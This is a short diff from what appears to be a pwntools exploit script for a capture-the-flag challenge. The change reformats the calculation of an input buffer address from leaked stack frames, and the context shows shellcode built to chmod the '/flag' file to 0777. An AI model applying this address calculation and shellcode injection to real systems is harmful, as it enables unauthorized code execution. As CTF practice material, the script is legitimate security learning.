@@ -69,9 +69,7 @@ with tee(pwn.process(find_challenge())) as io:
     else:
         pwn.error("Failed to find frame address")
 
-    input_addr = (
-        last_frame_addr - frame_size - frame_size - (frames_offset - buffer_offset)
-    )
+    input_addr = last_frame_addr - frame_size - frame_size - (frames_offset - buffer_offset)
     pwn.success(f"Calculated input address: {input_addr:#x}")
     shellasm = pwn.shellcraft.chmod("/flag", 0o777)  # type: ignore
     shellasm = r"""
